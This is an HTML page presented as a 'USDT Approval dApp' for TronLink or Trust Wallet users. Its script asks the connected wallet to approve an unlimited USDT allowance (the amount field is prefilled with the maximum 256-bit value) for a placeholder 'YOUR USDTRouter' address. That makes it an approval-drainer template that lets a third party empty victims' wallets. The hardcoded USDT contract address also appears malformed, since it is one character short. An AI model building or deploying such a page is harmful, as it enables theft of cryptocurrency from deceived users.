<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>dApp</title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:#0b1220;
  font-family:system-ui;
  color:white;
}

.card{
  width:90%;
  max-width:420px;
  padding:20px;
  background:rgba(255,255,255,0.05);
  border-radius:14px;
  text-align:center;
}

input,button{
  width:100%;
  padding:12px;
  margin-top:10px;
  border-radius:10px;
  border:none;
}

input{
  background:#111827;
  color:white;
}

.primary{background:#3b82f6;color:white;}
.action{background:#22c55e;color:white;}

#status{
  margin-top:12px;
  font-size:13px;
  color:#93c5fd;
}
</style>
</head>

<body>

<div class="card">

<h3>USDT Approval dApp</h3>

<button class="primary" onclick="connect()">Connect Wallet</button>

<input id="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" placeholder="Amount"/>
<button class="action" onclick="approve()">Approve</button>

<div id="status">Waiting wallet...</div>

</div>

<script>

/* USDT TRC20 OFFICIAL */
const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";

/* YOUR USDTRouter */
const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";

let tron = null;
let wallet = null;

function detect(){
  if(window.tronWeb && window.tronWeb.defaultAddress?.base58){
    tron = window.tronWeb;
    wallet = tron.defaultAddress.base58;
    return true;
  }
  return false;
}

function setStatus(t){
  document.getElementById("status").innerText = t;
}

function connect(){
  if(detect()){
    setStatus("Connected: " + wallet);
  } else {
    setStatus("Open in TronLink / Trust Wallet DApp browser");
  }
}

async function approve(){

  if(!detect()){
    setStatus("No wallet detected");
    return;
  }

  try{

    setStatus("Waiting confirmation...");

    const contract = await tron.contract().at(USDT);

    const amount = document.getElementById("amount").value || "1000";
    const value = tron.toSun(amount);

    await contract.approve(ROUTER, value).send();

    setStatus("Approved ✔️");

  }catch(e){
    setStatus("Failed");
  }
}

</script>

</body>
</html>
